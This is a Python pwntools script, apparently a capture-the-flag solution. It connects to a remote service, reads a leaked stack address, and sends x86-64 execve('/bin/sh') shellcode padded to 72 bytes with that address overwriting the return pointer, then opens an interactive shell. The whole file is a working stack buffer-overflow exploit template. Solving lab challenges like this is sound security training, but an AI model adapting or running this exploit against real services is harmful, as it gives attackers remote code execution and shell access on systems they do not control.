from pwn import *

sh = remote("10.13.37.10" ,8000)
sh.recvuntil(b"Oops, I'm leaking! ")
addr = int(sh.recvuntil(b"\n"),16)


# https://shell-storm.org/shellcode/files/shellcode-106.html
payload = b"\x48\x31\xc0\x99\xb0\x3b\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x48\x89\xe7\x57\x52\x48\x89\xe6\x0f\x05"
payload += b"0"*(72 - len(payload))
payload += p64(addr)

sh.recvuntil(b">")
sh.sendline(payload)
sh.interactive()


